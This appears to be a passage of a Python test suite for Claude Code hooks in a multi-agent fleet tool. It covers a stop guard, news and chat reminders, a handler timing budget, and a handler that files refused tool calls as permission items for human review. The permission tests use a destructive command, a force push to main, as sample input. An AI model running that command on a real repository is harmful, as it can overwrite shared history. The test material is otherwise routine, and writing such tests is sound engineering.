        self.assertIn("--resume --once`", self.blocked(self.stop()))

    def test_a_dead_reused_or_foreign_pid_does_not_count(self):
        pid_file = self.fleet / "watch-coordinator.pid"
        dead = subprocess.Popen([sys.executable, "-c", "pass"])
        dead.wait()
        pid_file.write_text(str(dead.pid))
        self.blocked(self.stop())
        self.fresh()
        pid_file.write_text(str(os.getpid()))  # alive, but not a watch
        self.blocked(self.stop())
        self.fresh()
        other = self.tmp / "other" / "coordinator"
        other.mkdir(parents=True)
        pid_file.write_text(str(self.watch(fleet=other, pid_file=False).pid))  # another fleet's watch
        self.blocked(self.stop())
        self.fresh()
        pid_file.write_text(str(self.watch(role="manager", pid_file=False).pid))  # the wrong role
        self.blocked(self.stop())

    def test_only_a_fleet_registered_as_this_sessions_is_guarded(self):
        self.watch()
        copy = self.pad / "infra"
        copy.mkdir()
        shutil.copy(self.fleet / "state.json", copy / "state.json")  # another fleet's ledger, copied to read
        self.assertSilent(self.stop())
        self.register(copy, session="sess-other", id="infra")  # served, but by another session
        self.assertSilent(self.stop())
        self.register(copy, id="infra")
        reason = self.blocked(self.stop())
        self.assertIn(f"chat {copy} watch --as coordinator", reason)
        self.assertNotIn(f"chat {self.fleet} watch", reason)

    def test_passes_with_stop_hook_active(self):
        self.assertSilent(self.hook("Stop", self.payload("Stop", stop_hook_active=True)))

    def test_passes_for_a_paused_or_done_fleet(self):
        for status in ("paused", "done"):
            self.ledger(status=status)
            self.assertSilent(self.stop())
        self.ledger(status="blocked")
        self.blocked(self.stop())

    def test_passes_for_a_worker(self):
        self.assertSilent(self.stop(agent_id="a1"))
        self.assertSilent(self.stop(env={"FLEET_WORKER": "a1", "FLEET_DIR": str(self.fleet)}))
        self.assertSilent(self.stop(env={"TSTACK_ROLE": "worker"}))

    def test_blocks_headless_and_through_fleet_dir(self):
        self.blocked(self.stop(env={"CLAUDE_CODE_SESSION_ATTENDED": "0", "CLAUDE_CODE_ENTRYPOINT": "sdk-cli"}))
        self.fresh()
        self.blocked(self.hook("Stop", self.base("Stop"), env={"FLEET_DIR": str(self.fleet)}))

    def test_silent_outside_a_fleet_and_on_a_broken_ledger(self):
        self.assertSilent(self.hook("Stop", self.base("Stop")))
        (self.fleet / "state.json").write_text("{not json")
        self.assertSilent(self.stop())
        (self.fleet / "state.json").write_text("[1, 2]")
        self.assertSilent(self.stop())
        self.assertNotIn("failed", self.log())


class NewsHookTest(FleetCase):
    """fleet_news: SessionStart and Stop name the machine's unread news in one line, never as a block."""

    def post(self, id, frm="skills", to=("all",), text="1.9.20 is out"):
        folder = self.registry / "news"
        folder.mkdir(exist_ok=True)
        with open(folder / "news.jsonl", "a") as f:
            f.write(json.dumps({"id": id, "at": "2026-01-05T09:00:00+00:00", "from": frm, "to": list(to), "kind": "fyi",
                                "keep": False, "text": text}) + "\n")

    def context(self, result):
        """The hook's context text ("" for none), whatever else a handler added to it."""
        self.assertEqual(result.returncode, 0, result.stderr)
        return json.loads(result.stdout)["hookSpecificOutput"]["additionalContext"] if result.stdout else ""

    def news(self, result):
        """The fleet news lines of the hook's context."""
        return [l for l in self.context(result).splitlines() if l.startswith("Fleet news:")]

    def line(self, count):
        return (f"Fleet news: {count} unread for p, never a wake. Read them when convenient: "
                f"`{self.fleet_cli} news read --as p`.")

    def test_session_start_and_stop_print_the_unread_line(self):
        self.watch()  # a live watch: the Stop guard stays quiet
        self.assertEqual(self.news(self.hook("SessionStart", self.payload("SessionStart", source="startup"))), [])
        self.post(1)
        self.post(2, to=("infra",))
        self.post(3, frm="p")
        self.assertEqual(self.news(self.hook("SessionStart", self.payload("SessionStart", source="resume"))), [self.line(1)])
        stop = lambda: self.hook("Stop", self.payload("Stop", stop_hook_active=False))
        out = stop()
        self.assertNotIn('"decision"', out.stdout, "news never blocks a stop")
        self.assertEqual(self.news(out), [self.line(1)])
        self.assertEqual(self.news(stop()), [], "told once per new item on Stop")
        self.post(4, to=("p", "infra"))
        self.assertEqual(self.news(stop()), [self.line(2)])
        (self.registry / "news" / "read").mkdir()
        (self.registry / "news" / "read" / "p").write_text("4")
        self.assertEqual(self.news(stop()), [])
        self.assertEqual(self.news(self.hook("SessionStart", self.payload("SessionStart", source="resume"))), [])

    def test_a_worker_and_a_session_hosting_no_fleet_hear_nothing(self):
        self.post(1)
        self.assertEqual(self.news(self.hook("SessionStart", self.payload("SessionStart", source="startup", agent_id="a1"))), [])
        self.assertEqual(self.news(self.hook("SessionStart", {**self.base("SessionStart"), "source": "startup"})), [])
        self.register(self.fleet, session="sess-other")
        self.assertEqual(self.news(self.hook("SessionStart", self.payload("SessionStart", source="startup"))), [])


class SaidOnceTest(FleetCase):
    """fleet_said_once: a host that answered the user on the page ends the turn with one line naming where."""

    LONG = ("The deploy is green on staging. I checked the three routes you named, the billing export now "
            "rounds to cents, and the retry queue drained in four minutes. Next I land the migration behind "
            "the flag and ask you before it reaches production.")

    def setUp(self):
        super().setUp()
        self.watch()  # a live chat watch: the listen guard stays silent, only this rule speaks
        self.calls = 0

    def bash(self, command, result, is_error=False):
        """A Bash call and its result, as the transcript records them."""
        self.calls += 1
        tid = f"toolu_{self.calls:02d}"
        self.transcribe(
            {"type": "assistant", "message": {"role": "assistant", "content": [
                {"type": "tool_use", "id": tid, "name": "Bash", "input": {"command": command}}]}},
            {"type": "user", "message": {"role": "user", "content": [
                {"type": "tool_result", "tool_use_id": tid, "content": result, "is_error": is_error}]}})

    def say_on_page(self, n=42, re=41, fleet=None, role="coordinator"):
        """The user's message #re in the chat, and a `say --re` answering it as #n, as the CLI prints it."""
        fleet = fleet or self.fleet_cli
        self.say(re, "2026-01-05T09:00:00+00:00", text="how is the deploy?", to=(role,))
        self.say(n, "2026-01-05T09:01:00+00:00", text=self.LONG, frm=role, to=("user",), re=re)
        self.bash(f'{fleet} chat {self.fleet} say --as {role} --re {re} "{self.LONG}"',
                  f"#{n} {role} -> user: {self.LONG} [re #{re}]\n")

    def reply(self, text):
        self.transcribe({"type": "assistant", "message": {"role": "assistant", "content": [
            {"type": "text", "text": text}]}})

    def stop(self, last=None, env=None, **extra):
        payload = self.payload("Stop", **{"stop_hook_active": False, **extra})
        if last is not None:
            payload["last_assistant_message"] = last
        return self.hook("Stop", payload, env=env)

    def blocked(self, result):
        self.assertEqual(result.returncode, 0, result.stderr)
        out = json.loads(result.stdout)
        self.assertEqual(out["decision"], "block")
        return out["reason"]

    def test_blocks_a_long_reply_after_answering_on_the_page(self):
        self.transcribe(said("#41 from the user: how is the deploy?"))
        self.say_on_page()
        self.reply(self.LONG)
        reason = self.blocked(self.stop(last=self.LONG))
        self.assertTrue(reason.startswith("You answered on the page (#42)."), reason)
        self.assertIn("'Answered #42 on the page.'", reason)
        self.assertIn("Do not repeat the answer here.", reason)

    def test_the_manager_too_and_through_a_shell_line(self):
        self.ledger(role="manager")
        self.watch(role="manager")
        self.transcribe(said("go"))
        self.say(6, "2026-01-05T09:00:00+00:00", to=("manager",))
        self.bash(f"cd /tmp && fleet chat {self.fleet} say --as manager --re 6 'short' && echo ok",
                  f"#7 manager -> user: short [re #6]\nok\n")
        self.assertIn("(#7)", self.blocked(self.stop(last=self.LONG)))

    def test_reads_the_final_text_from_the_transcript_without_last_assistant_message(self):
        self.transcribe(said("go"))
        self.say_on_page()
        self.reply(self.LONG)
        self.blocked(self.stop())

    def test_a_one_line_reply_stops(self):
        self.transcribe(said("go"))
        self.say_on_page()
        self.reply("Answered #42 on the page.")
        self.assertSilent(self.stop(last="Answered #42 on the page."))
        self.assertSilent(self.stop(last="Answered #42 on the page.\nWaiting on a2's report."))

    def test_a_turn_that_did_not_say_stops(self):
        self.transcribe(said("go"))
        self.bash(f"{self.fleet_cli} chat {self.fleet} inbox --as coordinator", "#41 user -> coordinator: hi\n")
        self.bash("echo fleet chat say", "fleet chat say\n")
        self.assertSilent(self.stop(last=self.LONG))

    def test_a_news_post_is_not_an_answer_on_the_page(self):
        # The false positive: a release note to every fleet, whose text names a say, printed as #21.
        self.transcribe(said("ship 1.9.33 and tell the fleets"))
        self.bash(f'{self.fleet_cli} news post --from skills --to all --kind release '
                  f'"1.9.33: answer with fleet chat DIR say --re N; see [re #3]"',
                  "#21 2026-10-10T14:00:00+00:00 skills -> all [release, kept]: "
                  "1.9.33: answer with fleet chat DIR say --re N; see [re #3]\n")
        self.reply(self.LONG)
        self.assertSilent(self.stop(last=self.LONG))
        # beside a real answer in the same turn, only the answer counts
        self.say_on_page()
        self.assertIn("You answered on the page (#42).", self.blocked(self.stop(last=self.LONG)))

    def test_only_a_reply_to_the_users_own_message_counts(self):
        self.transcribe(said("go"))
        self.say(30, "2026-01-05T09:00:00+00:00", frm="a1", to=("coordinator",), text="a1: done")
        self.bash(f'{self.fleet_cli} chat {self.fleet} say --as coordinator --re 30 "thanks, a1"',
                  "#31 coordinator -> user, a1 (notes-impl): thanks, a1 [re #30]\n")
        self.bash(f'{self.fleet_cli} chat {self.fleet} say --as coordinator "status: a2 runs"',
                  "#32 coordinator -> user: status: a2 runs\n")
        self.bash(f'{self.fleet_cli} tell p "go on"', "p: #33 user -> coordinator: go on\n")
        self.bash(f'{self.fleet_cli} state {self.fleet} event "a2 started" --no-render', "")
        self.assertSilent(self.stop(last=self.LONG))

    def test_a_say_in_an_earlier_turn_does_not_count(self):
        self.transcribe(said("first"))
        self.say_on_page()
        self.reply("Answered #42 on the page.")
        self.transcribe(said("now explain it here"))
        self.reply(self.LONG)
        self.assertSilent(self.stop(last=self.LONG))

    def test_a_say_that_failed_does_not_count(self):
        self.transcribe(said("go"))
        self.bash(f'{self.fleet_cli} chat {self.fleet} say --as coordinator --re 99 "x"',
                  "fleet chat: unknown message #99", is_error=True)
        self.assertSilent(self.stop(last=self.LONG))

    def test_a_worker_stops(self):
        self.transcribe(said("go"))
        self.say_on_page()
        self.assertSilent(self.stop(last=self.LONG, agent_id="a1"))
        self.assertSilent(self.stop(last=self.LONG, env={"FLEET_WORKER": "a1", "FLEET_DIR": str(self.fleet)}))
        self.assertSilent(self.stop(last=self.LONG, env={"TSTACK_ROLE": "worker"}))

    def test_a_session_that_hosts_no_fleet_stops(self):
        self.transcribe(said("go"))
        self.say_on_page()
        self.assertSilent(self.hook("Stop", {**self.base("Stop"), "last_assistant_message": self.LONG}))

    def test_never_blocks_twice(self):
        self.transcribe(said("go"))
        self.say_on_page()
        self.assertSilent(self.stop(last=self.LONG, stop_hook_active=True))
        self.blocked(self.stop(last=self.LONG))
        self.assertSilent(self.stop(last=self.LONG))  # the same turn, even without stop_hook_active
        self.transcribe(said("next"))
        self.say_on_page(n=43, re=42)
        self.assertIn("(#43)", self.blocked(self.stop(last=self.LONG)))  # a new turn is held to it again

    def test_a_malformed_transcript_fails_open(self):
        self.transcript.write_bytes(os.urandom(2048) + b'\n{"type":"user" broken\n[1]\n"tool_use"\n'
                                    + b'{"type":"assistant","message":{"content":[{"type":"tool_use",'
                                    + b'"name":"Bash","input":{"command":"fleet chat x say"}}]}}\n')
        self.assertSilent(self.stop(last=self.LONG))
        for path in (str(self.tmp / "missing.jsonl"), str(self.tmp), 42, None):
            self.assertSilent(self.stop(last=self.LONG, transcript_path=path))
        self.assertSilent(self.stop(last=["not", "text"]))
        self.assertNotIn("failed", self.log())


# The chat nudge's budget, 2 ms where json.loads of 300 chat lines takes 0.82 ms (2026-10-09), as a multiple of that
# parse: a cost that holds on a busy machine, where both run slower together.
REF_BUDGET = 2 / 0.82
# The handler's wall time, at most WALL_PER_CPU times its CPU time plus WALL_SLACK_MS: CPU time alone misses a sleep, an
# I/O wait or a subprocess. 2026-10-10, 32 cores, medians of first look / steady (CPU, wall ms): as it is 1.06/1.07 and
# 0.24/0.24, and under 64 busy loops 1.95/1.98 and 0.34/0.36 (preemption barely moves a median); a planted 3 ms sleep
# 1.27/4.34 and 0.32/3.38, a planted subprocess.run(["true"]) 1.39/2.85 and 0.41/1.80: the steady bound (1.14 and
# 1.32 ms) fails both.
WALL_PER_CPU, WALL_SLACK_MS = 2, 0.5


class ChatNudgeTest(FleetCase):
    """fleet_chat_nudge: a session busy mid-turn is told of the user's messages its chat left waiting."""

    def tool(self, now, env=None, **extra):
        r = self.hook("PostToolUse", self.payload("PostToolUse", tool_name="Bash", tool_input={"command": "ls"}, **extra),
                      env={"FLEET_NOW": now, "TZ": "UTC", **(env or {})})
        self.assertEqual(r.returncode, 0, r.stderr)
        if not r.stdout:
            return ""
        out = json.loads(r.stdout)
        self.assertEqual(out["hookSpecificOutput"]["hookEventName"], "PostToolUse")
        return out["hookSpecificOutput"]["additionalContext"]

    def test_fires_after_three_minutes_not_before_and_once(self):
        text = "please delete the five finished workspaces,\nall of them " * 3
        self.say(1, "2026-01-05T09:00:00+00:00", text)
        self.assertEqual(self.tool("2026-01-05T09:02:00+00:00"), "")
        context = self.tool("2026-01-05T09:04:10+00:00")
        first = " ".join(text.split())[:80]
        self.assertEqual(len(first), 80)
        self.assertEqual(context,
                         f'Fleet: #1 from the user, unread for 4 min: "{first}…". Read the chat now '
                         f"(`{self.fleet_cli} chat {self.fleet} inbox --as coordinator`) and answer or record it.")
        self.assertEqual(self.tool("2026-01-05T09:10:00+00:00"), "")  # told once

    def test_fleet_nudge_min_sets_the_wait(self):
        self.say(1, "2026-01-05T09:00:00+00:00")
        self.assertEqual(self.tool("2026-01-05T09:04:00+00:00", env={"FLEET_NUDGE_MIN": "5"}), "")
        self.assertIn("#1", self.tool("2026-01-05T09:05:00+00:00", env={"FLEET_NUDGE_MIN": "5"}))

    def test_throttled_to_once_a_minute(self):
        self.say(1, "2026-01-05T08:00:00+00:00")
        self.assertIn("#1", self.tool("2026-01-05T09:00:00+00:00"))
        self.say(2, "2026-01-05T08:30:00+00:00")
        self.assertEqual(self.tool("2026-01-05T09:00:30+00:00"), "")
        self.assertIn("#2 from the user, unread for 31 min", self.tool("2026-01-05T09:01:00+00:00"))

    def test_read_answered_or_someone_elses_is_not_told(self):
        self.ledger(agents=[{"id": "a1", "name": "a1"}])
        self.say(1, "2026-01-05T08:00:00+00:00")  # read: the watch printed up to #1
        (self.fleet / "watch-coordinator.cursor").write_text("1")
        self.say(2, "2026-01-05T08:00:00+00:00")
        self.say(3, "2026-01-05T08:01:00+00:00", "on it", frm="coordinator", to=("user",), re=2)  # answered
        self.say(4, "2026-01-05T08:00:00+00:00", to=("a1",))  # to a worker: the watch forwards it
        self.say(5, "2026-01-05T08:00:00+00:00", "and this?")
        context = self.tool("2026-01-05T09:00:00+00:00")
        self.assertEqual([line.split(" from")[0] for line in context.splitlines()], ["Fleet: #5"])

    def test_a_decision_answer_not_recorded(self):
        decision = {"id": "x7", "ref": "A7", "kind": "action", "title": "Delete five finished worker workspaces?",
                    "status": "open", "opened": "2026-01-05T08:00:00+00:00"}
        self.ledger(decisions=[decision])
        self.say(1, "2026-01-05T08:10:00+00:00", "yes", decision="x7")
        (self.fleet / "watch-coordinator.cursor").write_text("1")  # read, and still not recorded
        context = self.tool("2026-01-05T08:22:00+00:00")
        self.assertEqual(context,
                         'Fleet: #1 from the user answers A7 (Delete five finished worker workspaces?), not recorded '
                         f'for 12 min: "yes". Record it now (`{self.fleet_cli} state {self.fleet} decision A7 --decide '
                         '"..." --resolution "answered on the page (#1)"`), then answer #1 with --re.')
        self.say(2, "2026-01-05T08:20:00+00:00", "yes, again", decision="x7")
        self.ledger(decisions=[{**decision, "status": "decided"}])  # recorded meanwhile
        self.assertEqual(self.tool("2026-01-05T08:30:00+00:00"), "")
        self.ledger(decisions=[{**decision, "held": "fixing first", "held_at": "2026-01-05T08:45:00+00:00"}])
        self.say(3, "2026-01-05T08:40:00+00:00", "go", decision="x7")  # held after it: the fleet works on it
        self.assertEqual(self.tool("2026-01-05T08:50:00+00:00"), "")

    def test_a_reply_to_an_answer_does_not_record_it(self):
        # Infra's D115: answered (#1), the coordinator replied "Recorded B" (#2, re 1), never ran --decide.
        decision = {"id": "d115", "ref": "D115", "kind": "decision", "title": "Schema", "status": "open",
                    "opened": "2026-01-05T08:00:00+00:00"}
        self.ledger(decisions=[decision])
        self.say(1, "2026-01-05T08:10:00+00:00", "B", decision="d115")
        self.say(2, "2026-01-05T08:11:00+00:00", "Recorded B", frm="coordinator", to=("user",), re=1, decision="d115")
        (self.fleet / "watch-coordinator.cursor").write_text("2")
        self.assertIn("Fleet: #1 from the user answers D115 (Schema), not recorded for 12 min", self.tool("2026-01-05T08:22:00+00:00"))

    def test_a_grilling_answered_and_not_recorded_whatever_the_chat_said_after(self):
        question = lambda n, status: {"id": f"q{n}", "title": "T", "status": status, "asked": "2026-01-05T08:00:00+00:00"}
        grilling = {"id": "g6", "ref": "G6", "kind": "grill", "title": "Search", "status": "open",
                    "opened": "2026-01-05T08:00:00+00:00", "questions": [question(1, "answered"), question(2, "answered")]}
        self.ledger(decisions=[grilling])
        self.say(1, "2026-01-05T08:10:00+00:00", "Q2: ok", decision="g6")
        self.say(2, "2026-01-05T08:10:30+00:00", "That empties the tree. Say 'confirm'.", frm="coordinator", to=("user",), re=1, decision="g6")
        self.say(3, "2026-01-05T08:11:00+00:00", "The advisor's amendments.", frm="coordinator", to=("user",), decision="g6")
        (self.fleet / "watch-coordinator.cursor").write_text("3")
        self.assertEqual(self.tool("2026-01-05T08:12:00+00:00"), "")
        self.assertEqual(self.tool("2026-01-05T08:14:00+00:00"),
                         "Fleet: G6 (Search): every question is answered and the grilling is still open, not recorded for 4 min. "
                         f'Record it now (`{self.fleet_cli} state {self.fleet} decision G6 --decide "..." --resolution "grilling finished"`).')
        self.assertEqual(self.tool("2026-01-05T08:20:00+00:00"), "")  # told once
        # An answer recorded as a question answered after it, a question left open: nothing is due.
        recorded = {**question(1, "answered"), "answered": "2026-01-05T08:30:20+00:00"}
        self.ledger(decisions=[{**grilling, "id": "g7", "ref": "G7", "questions": [recorded, question(2, "open")]}])
        self.say(4, "2026-01-05T08:30:00+00:00", "Q1: ok", decision="g7")
        self.say(5, "2026-01-05T08:30:30+00:00", "Recorded.", frm="coordinator", to=("user",), re=4, decision="g7")
        self.assertEqual(self.tool("2026-01-05T08:40:00+00:00"), "")

    def test_at_most_three_lines_and_the_count(self):
        for n in range(1, 6):
            self.say(n, "2026-01-05T08:00:00+00:00", f"message {n}")
        lines = self.tool("2026-01-05T09:00:00+00:00").splitlines()
        self.assertEqual(len(lines), 4)
        self.assertEqual(lines[-1], "Fleet: and 2 more.")

    def test_the_manager_reads_as_manager(self):
        self.ledger(role="manager")
        self.say(1, "2026-01-05T08:00:00+00:00", to=("manager",))
        self.assertIn(f"chat {self.fleet} inbox --as manager`", self.tool("2026-01-05T09:00:00+00:00"))

    def test_never_for_a_worker(self):
        self.say(1, "2026-01-05T08:00:00+00:00")
        self.assertEqual(self.tool("2026-01-05T09:00:00+00:00", agent_id="a1"), "")
        self.assertEqual(self.tool("2026-01-05T09:00:00+00:00", env={"FLEET_WORKER": "a1", "FLEET_DIR": str(self.fleet)}), "")
        self.assertEqual(self.tool("2026-01-05T09:00:00+00:00", env={"TSTACK_ROLE": "worker"}), "")
        self.assertIn("#1", self.tool("2026-01-05T09:00:00+00:00"))  # the coordinator still is

    def test_a_chat_written_after_the_first_look_and_a_torn_line(self):
        self.say(1, "2026-01-05T08:59:00+00:00")
        self.assertEqual(self.tool("2026-01-05T09:00:00+00:00"), "")
        line = json.dumps({"id": 2, "at": "2026-01-05T09:00:00+00:00", "from": "user", "to": ["coordinator"],
                           "text": "two", "re": None})
        with open(self.fleet / "chat.jsonl", "a") as f:
            f.write(line[:20])
        self.assertIn("#1", self.tool("2026-01-05T09:05:00+00:00"))
        with open(self.fleet / "chat.jsonl", "a") as f:
            f.write(line[20:] + "\n")
        self.assertIn("#2", self.tool("2026-01-05T09:06:00+00:00"))

    def test_never_raises_on_a_broken_chat_or_ledger(self):
        with open(self.fleet / "chat.jsonl", "wb") as f:
            f.write(os.urandom(2048) + b"\n[1]\nnull\n" + b'{"id": "x", "from": "user", "to": [], "text": "t"}\n'
                    + b'{"id": 9, "at": "yesterday", "from": "user", "to": ["coordinator"], "text": "t", "re": null}\n'
                    + b'{"id": 10, "at": 5, "from": "user", "to": "coordinator", "text": "t", "re": null}\n'
                    + b'{"id": 11, "at": "2026-01-05T08:00:00", "from": "user", "to": ["coordinator"], "text": "naive",'
                    + b' "re": null, "decision": ["odd"]}\n')
        self.assertEqual(self.tool("2026-01-05T09:00:00+00:00"), "")  # 11 answers a decision that is not there
        for n, ledger in enumerate(("{not json", "[]", '{"decisions": "none", "role": 7}')):
            (self.fleet / "state.json").write_text(ledger)
            self.say(20 + n, "2026-01-05T08:00:00+00:00")
            self.assertIn(f"#{20 + n} from the user, unread for", self.tool(f"2026-01-05T1{n}:00:00+00:00"))
        (self.fleet / "chat.jsonl").unlink()
        (self.fleet / "chat.jsonl").mkdir()  # a folder where the chat goes
        self.assertEqual(self.tool("2026-01-05T12:00:00+00:00"), "")
        state = self.data / "sessions" / "sess-1.fleet-nudge.json"
        state.write_text('{"checked": "x", "fleets": {"' + str(self.fleet) + '": {"offset": -3, "pending": [], "told": 4}}}')
        self.assertEqual(self.tool("2026-01-05T13:00:00+00:00"), "")
        self.assertNotIn("failed", self.log())

    def test_the_handler_takes_under_two_milliseconds(self):
        """2,000 lines (workers talking, the user's messages answered), measured as its worst case: each run
        is a session's first look (no offset kept) and something is due, so the ledger is read too.

        The budget is the handler's own work: 2 ms on the machine it was set on, where json.loads of 300 chat
        lines takes 0.82 ms, so the handler may cost REF_BUDGET (2 / 0.82) times that parse, timed beside it
        in this process's CPU time. Neither the wall clock nor CPU time alone holds still on a busy machine:
        with every core taken, the handler's median went from 1.2 to 2.2 ms in both (SMT siblings and clock
        speed slow the work itself), while the ratio to the parse stayed at 1.3-1.4. The absolute medians
        are printed beside it. CPU time misses time spent off the CPU (a sleep, a wait on I/O or on a child), so
        the median wall time is held to WALL_PER_CPU times the median CPU time plus WALL_SLACK_MS too."""
        n = 0
        for i in range(400):
            at = "2026-01-05T08:00:00+00:00"
            n += 1
            self.say(n, at, f"please look at item {i} " * 4)
            for k in range(3):
                n += 1
                self.say(n, at, f"worker note {k} on item {i}: " + "x" * 120, frm="a1", to=("coordinator", "user"))
            n += 1
            self.say(n, at, "done", frm="coordinator", to=("user",), re=n - 4)
        self.say(n + 1, "2026-01-05T08:00:00+00:00", "still there?")
        self.assertEqual(len((self.fleet / "chat.jsonl").read_text().splitlines()), 2001)
        module = load_hook()
        env = {**self.env, "FLEET_NOW": "2026-01-05T09:00:00+00:00"}
        payload = self.payload("PostToolUse", tool_name="Bash")
        state = self.data / "sessions" / "sess-1.fleet-nudge.json"
        reference = (self.fleet / "chat.jsonl").read_text().splitlines()[:300]

        def timed(run):
            """(the run's CPU ms, the reference parse's CPU ms, the run's wall ms), timed back to back."""
            r0 = time.process_time()
            for line in reference:
                json.loads(line)
            r1, w1 = time.process_time(), time.perf_counter()
            got = run()
            r2, w2 = time.process_time(), time.perf_counter()
            return got, (r2 - r1) * 1000, (r1 - r0) * 1000, (w2 - w1) * 1000

        first = []
        for _ in range(100):
            state.unlink(missing_ok=True)
            hook = module.Hook("PostToolUse", payload, env)
            out, cpu, ref, wall = timed(lambda: module.fleet_chat_nudge(hook))
            first.append((cpu, ref, wall))
            self.assertIn(f"#{n + 1} from the user", out)
        steady = []
        for _ in range(100):  # the usual run: an offset kept, a line or two new
            saved = json.loads(state.read_text())
            saved["checked"] = 0
            state.write_text(json.dumps(saved))
            self.say(n + 2, "2026-01-05T08:59:00+00:00", frm="a1", to=("coordinator",))
            hook = module.Hook("PostToolUse", payload, env)
            steady.append(timed(lambda: module.fleet_chat_nudge(hook))[1:])
        med = lambda rows, i: statistics.median(r[i] for r in rows)  # noqa: E731
        ratio = lambda rows: statistics.median(cpu / ref for cpu, ref, _ in rows)  # noqa: E731
        print(f"\n  chat nudge on 2,000 lines: first look median {med(first, 0):.2f} ms CPU ({med(first, 2):.2f} wall), "
              f"then {med(steady, 0):.2f} ms ({med(steady, 2):.2f}); {ratio(first):.2f} and {ratio(steady):.2f} times "
              f"a 300-line parse ({med(first, 1):.2f} ms)", end="", file=sys.stderr)
        self.assertLess(ratio(first), REF_BUDGET, first[:10])
        self.assertLess(ratio(steady), REF_BUDGET, steady[:10])
        for name, rows in (("first look", first), ("steady", steady)):
            self.assertLess(med(rows, 2), WALL_PER_CPU * med(rows, 0) + WALL_SLACK_MS,
                            f"{name}: the handler waits off the CPU (a sleep, I/O, a subprocess): {rows[:10]}")
        quiet = module.Hook("PostToolUse", self.base("PostToolUse"), self.env)
        started = time.process_time()
        for _ in range(200):
            module.fleet_chat_nudge(quiet)
        self.assertLess((time.process_time() - started) * 1000 / 200, 0.5)  # outside a fleet: next to nothing


STAND_IN = """#!{python}
import json, os, sys
with open(os.environ["STAND_IN_LOG"], "a") as f:
    f.write(json.dumps(sys.argv[1:]) + "\\n")
if os.environ.get("STAND_IN_FAIL"):
    sys.stderr.write("refused: " + os.environ["STAND_IN_FAIL"] + "\\n")
    sys.exit(2)
"""


def options(argv):
    """A recorded `state DIR decision ID ...` argv as (positionals, {flag: value or True})."""
    positionals, found, i = [], {}, 0
    while i < len(argv):
        word = argv[i]
        if word.startswith("--"):
            flag, eq, value = word.partition("=")
            if eq:
                found[flag] = value
            elif i + 1 < len(argv) and not argv[i + 1].startswith("--"):
                found[flag] = argv[i + 1]
                i += 1
            else:
                found[flag] = True
        else:
            positionals.append(word)
        i += 1
    return positionals, found


class PermissionDeniedTest(FleetCase):
    """fleet_permission_denied: a refused call opens the permission item (or an action) through the fleet CLI."""

    PUSH = "git push --force origin HEAD:main"

    def setUp(self):
        super().setUp()
        self.calls = self.tmp / "cli-calls.jsonl"
        cli = self.tmp / "fleet-stand-in"
        cli.write_text(STAND_IN.format(python=sys.executable))
        cli.chmod(0o755)
        self.project = self.tmp / "project"
        self.project.mkdir()
        self.env.update({"TSTACK_FLEET_CLI": str(cli), "STAND_IN_LOG": str(self.calls),
                         "CLAUDE_PROJECT_DIR": str(self.project)})
        self.ledger(agents=[{"id": "a2", "name": "a2", "task_id": "ab12cd34"}])

    def refuse(self, command=PUSH, tool="Bash", tool_input=None, env=None, **extra):
        payload = self.payload("PermissionDenied", tool_name=tool, reason="[Git Destructive]",
                               tool_input=tool_input if tool_input is not None else {"command": command},
                               tool_use_id="toolu_9", **extra)
        r = self.hook("PermissionDenied", payload, env=env)
        self.assertSilent(r)
        return r

    def recorded(self):
        if not self.calls.exists():
            return []
        return [options(json.loads(line)) for line in self.calls.read_text().splitlines()]

    def only(self):
        calls = self.recorded()
        self.assertEqual(len(calls), 1, calls)
        return calls[0]

    @staticmethod
    def expected_id(caller, call):
        import hashlib
        return "p-" + hashlib.sha1(f"{caller}\n{call}".encode()).hexdigest()[:8]

    def test_a_workers_bash_refusal_opens_a_permission(self):
        self.refuse(agent_id="ab12cd34")
        positionals, opts = self.only()
        self.assertEqual(positionals, ["state", str(self.fleet), "decision", self.expected_id("ab12cd34", self.PUSH)])
        self.assertEqual(opts["--kind"], "permission")
        self.assertEqual((opts["--tool"], opts["--call"], opts["--cause"], opts["--root"]),
                         ("Bash", self.PUSH, "[Git Destructive]", str(self.project)))
        self.assertEqual((opts["--agent-id"], opts["--agent"], opts["--blocking"]), ("ab12cd34", "a2", True))
        self.assertIn("a2", opts["--title"])
        self.assertIn(self.PUSH, opts["--title"])
        self.assertNotIn("\n", opts["--question"])
        self.assertTrue(opts["--question"].endswith("?"), opts["--question"])
        self.assertIn("[Git Destructive]", opts["--why"])
        for absent in ("--manual", "--option", "--recommend"):
            self.assertNotIn(absent, opts)

    def test_the_root_falls_back_to_the_inputs_cwd(self):
        env = {k: v for k, v in self.env.items() if k != "CLAUDE_PROJECT_DIR"}
        self.env = env
        self.refuse(agent_id="ab12cd34")
        self.assertEqual(self.only()[1]["--root"], str(self.repo))

    def test_the_caller_is_the_ledgers_row_else_fleet_worker_else_none(self):
        self.refuse(agent_id="ffff0000", env={"FLEET_WORKER": "w9"})
        self.refuse(agent_id="ffff0000")
        self.refuse()
        unknown_env, unknown, main = [c[1] for c in self.recorded()]
        self.assertEqual((unknown_env["--agent"], unknown_env["--agent-id"]), ("w9", "ffff0000"))
        self.assertNotIn("--agent", unknown)
        self.assertEqual(unknown["--agent-id"], "ffff0000")
        self.assertNotIn("--agent", main)
        self.assertNotIn("--agent-id", main)
        self.assertEqual(self.recorded()[2][0][3], self.expected_id("main", self.PUSH))
        self.assertIn("coordinator", main["--title"])

    def test_the_same_caller_and_call_keep_one_id(self):
        self.refuse(agent_id="ab12cd34")
        self.refuse(agent_id="ab12cd34")
        self.refuse(agent_id="ab12cd34", command=self.PUSH + " 2>&1")
        self.refuse(agent_id="ee55ee55")
        ids = [c[0][3] for c in self.recorded()]
        self.assertEqual(ids[0], ids[1])
        self.assertEqual(len(set(ids)), 3)

    def test_a_closed_row_makes_the_next_refusal_a_new_one(self):
        base = self.expected_id("ab12cd34", self.PUSH)
        agents = [{"id": "a2", "name": "a2", "task_id": "ab12cd34"}]
        self.ledger(agents=agents, decisions=[{"id": base, "status": "decided"}])
        self.refuse(agent_id="ab12cd34")
        self.ledger(agents=agents, decisions=[{"id": base, "status": "decided"}, {"id": f"{base}-2", "status": "open"}])
        self.refuse(agent_id="ab12cd34")
        self.ledger(agents=agents, decisions=[{"id": base, "status": "withdrawn"}, {"id": f"{base}-2", "status": "decided"}])
        self.refuse(agent_id="ab12cd34")
        self.ledger(agents=agents, decisions=[{"id": base, "status": "open"}])
        self.refuse(agent_id="ab12cd34")
        self.assertEqual([c[0][3] for c in self.recorded()], [f"{base}-2", f"{base}-2", f"{base}-3", base])
        for _, opts in self.recorded():
            self.assertNotIn("--supersedes", opts)

